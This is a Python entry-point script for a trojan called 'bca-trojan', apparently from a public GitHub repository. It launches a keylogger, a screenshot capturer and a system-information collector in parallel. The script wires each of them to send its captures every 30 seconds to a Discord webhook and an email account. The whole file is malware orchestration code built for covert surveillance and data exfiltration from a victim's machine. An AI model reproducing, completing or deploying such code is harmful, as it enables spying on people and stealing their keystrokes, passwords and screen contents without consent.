#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import sys
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Union

import dotenv

dotenv.load_dotenv()


def bca_trojan(*, exfil_time: float,
               screenshot: Union[str, Path]) -> None:
    keylogger = KeyLogger(exfil_time=exfil_time)
    screenshot = ScreenShot(image_path=screenshot, exfil_time=exfil_time)
    sysinfo = SystemInformation()

    with ThreadPoolExecutor() as executor:
        for module in screenshot, sysinfo, keylogger:
            Discord(module=module,
                    webhook_url=os.getenv("WEBHOOK_URL"))
            Email(module=module,
                  smtp_host=os.getenv("EMAIL_HOST"),
                  smtp_port=int(os.getenv("EMAIL_PORT")),
                  email=os.getenv("EMAIL_USERNAME"),
                  password=os.getenv("EMAIL_PASSWORD"))
            executor.submit(module.execute)


if __name__ == "__main__":
    sys.path.insert(0, str(Path(__file__).parents[1]))
    from src.modules.exfiltration import Discord, Email
    from src.modules.exploitation import KeyLogger, ScreenShot, \
        SystemInformation

    bca_trojan(exfil_time=30, screenshot="/tmp/screenshot.png")
